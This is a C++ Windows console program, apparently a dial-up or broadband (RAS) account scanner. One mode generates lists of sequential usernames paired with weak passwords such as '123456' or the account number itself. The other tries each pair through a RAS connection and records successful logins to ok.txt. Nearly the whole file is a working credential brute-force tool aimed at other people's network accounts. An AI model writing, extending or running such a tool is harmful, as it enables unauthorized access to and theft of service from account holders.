// Read.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "Module.h"




BOOL SetConsoleColor(WORD wAttributes)

{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	if (hConsole == INVALID_HANDLE_VALUE)
		return FALSE;
	BOOL bResult = SetConsoleTextAttribute(hConsole, wAttributes);
	return bResult;

}






int _tmain(int argc, _TCHAR* argv[])
{	
	cout << "input 1 stat scan  ,2 gen password：";
	int iCode;
	cin >> iCode;
	if (iCode == 1){
		ifstream ifuList("uList.txt");
		string sUserName;
		string sPassWord;
		while (!ifuList.eof())
		{
			ifuList >> sUserName;
			ifuList >> sPassWord;
			cout << "--------------------------------------------" << endl;
			cout << sUserName << " 正在验证" << endl;
			if (RasConnection(sUserName, sPassWord) == true){
				ofstream okuList("ok.txt", ios::app);
				okuList << sUserName << " " << sPassWord<<endl;
				okuList.close();
				SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY | BACKGROUND_BLUE);
				cout << "扫描成功:" <<sUserName<< " "<< sPassWord <<endl;
				SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
			}
		}
		ifuList.close();
	}
	else{
	
		cout << "input net UserName: ";
		string sUserName;
		cin >> sUserName;
		cout << "input nums: ";
		int nCount = 0;
		cin >> nCount;
		cout << "input types: ";
		int type = 0;
		cin >> type;
		LONG64 iFor = _atoi64(sUserName.substr(sUserName.length() - 6, sUserName.length()).c_str());
		string sUserNameTop = sUserName.substr(0, sUserName.length() - 6);
		ofstream fuList("uList.txt");
		for (LONG64 i = iFor; i < (iFor + nCount); i++)
		{
			char Tmp[20];
			_ui64toa_s(i, Tmp, 20, 10);
			string sPassWord = "123456";
			if (type == 1 || (type == 2)){
				sPassWord = Tmp;
			}
			string n;
			if (type != 3 && (type != 2)){
				if (strlen(Tmp) == 5){
					n = "0";
				}
				if (strlen(Tmp) == 4){
					n = "00";
				}
				if (strlen(Tmp) == 3){
					n = "000";
				}
				if (strlen(Tmp) == 2){
					n = "0000";
				}
				if (strlen(Tmp) == 1){
					n = "00000";
				}
				sUserName = EnCode(sUserNameTop+n + Tmp);
				//sUserName = sUserNameTop + Tmp;
			}
			else{
				sUserName = sUserNameTop + Tmp;
			}

			fuList << sUserName << " " << sPassWord << endl;

			cout << sUserNameTop + Tmp << endl;
		}
		fuList.close();
	}




	system("pause");
	return 0;
}

